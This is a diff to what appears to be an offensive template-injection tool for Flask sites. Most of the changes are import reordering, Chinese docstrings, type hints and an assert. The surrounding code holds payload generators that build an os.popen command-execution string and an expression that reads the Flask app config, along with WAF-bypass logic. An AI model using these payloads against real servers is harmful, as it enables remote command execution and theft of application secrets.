@@ -2,11 +2,12 @@
 
 """
 
+import functools
 import logging
 import random
-import time
-import functools
 import re
+import sys
+import time
 
 from collections import namedtuple
 from string import ascii_lowercase
@@ -34,10 +35,8 @@ from .context_vars import ContextVariableManager
 from .options import Options
 
 
-import sys
-
 if sys.version_info >= (3, 8):
-    from typing import Union, Callable, Dict, Tuple, Literal
+    from typing import Union, Callable, Dict, Tuple
 else:
     from typing_extensions import Union, Callable, Dict, Tuple, Literal
 logger = logging.getLogger("cracker")
@@ -70,10 +69,13 @@ def guess_python_version(url: str, requester: HTTPRequester) -> PythonEnvironmen
 
 
 class EvalArgsModePayloadGen:
+    """在EvalArgs模式下的payload生成器"""
+
     def __init__(self, will_print):
         self.will_print = will_print
 
     def generate(self, gen_type, *args):
+        """生成EvalArgs模式下的payload"""
         if gen_type == OS_POPEN_READ:
             return f"__import__('os').popen({repr(args[0])}).read()", self.will_print
         elif gen_type == EVAL:
@@ -84,7 +86,8 @@ class EvalArgsModePayloadGen:
             return f"eval({repr(req[1])})", self.will_print
         elif gen_type == CONFIG:
             return (
-                "[v.config for v in sys.modules['__main__'].__dict__.values() if isinstance(v, sys.modules['flask'].Flask)][0]",
+                "[v.config for v in sys.modules['__main__'].__dict__.values()"
+                + " if isinstance(v, sys.modules['flask'].Flask)][0]",
                 self.will_print,
             )
         return None, None
@@ -185,6 +188,12 @@ class Cracker:
     def crack_with_waf(
         self, waf_func, waf_expr_func=None
     ) -> Union[Tuple[FullPayloadGen, bool, str, TargetAndSubTargets], None]:
+        """实际进行Crack的函数
+
+        Returns:
+            Union[Tuple[FullPayloadGen, bool, str, TargetAndSubTargets], None]:
+                攻击结果
+        """
         full_payload_gen = FullPayloadGen(
             waf_func,
             callback=None,
@@ -198,7 +207,13 @@ class Cracker:
         test_result = self.test_payload(payload, will_print)
         return full_payload_gen, will_print, test_result, tree
 
-    def log_with_result(self, will_print, test_result):
+    def log_with_result(self, will_print: bool, test_result: str):
+        """根据攻击结果打印log
+
+        Args:
+            will_print (bool): payload是否会产生回显
+            test_result (str): 攻击结果
+        """
         if will_print:
             if test_result == "SUCCESS":
                 logger.info(
@@ -227,7 +242,9 @@ class Cracker:
                     + "You can try generating payloads anyway.",
                 )
 
-    def expr_waf_not500(self, tree, outer_pattern, context_vars: ContextVariableManager):
+    def expr_waf_not500(
+        self, tree, outer_pattern, context_vars: ContextVariableManager
+    ):
         def is_expr_bad(expr):
             payload = context_vars.get_payload(
                 context_vars.get_context()
@@ -262,6 +279,9 @@ class Cracker:
         if not result:
             return None
         full_payload_gen, will_print, test_result, tree = result
+        assert (
+            full_payload_gen.context_vars is not None
+        ), "when generated successfully, this should not be none"
         self.log_with_result(will_print, test_result)
         if (
             test_result == "FAIL_500"
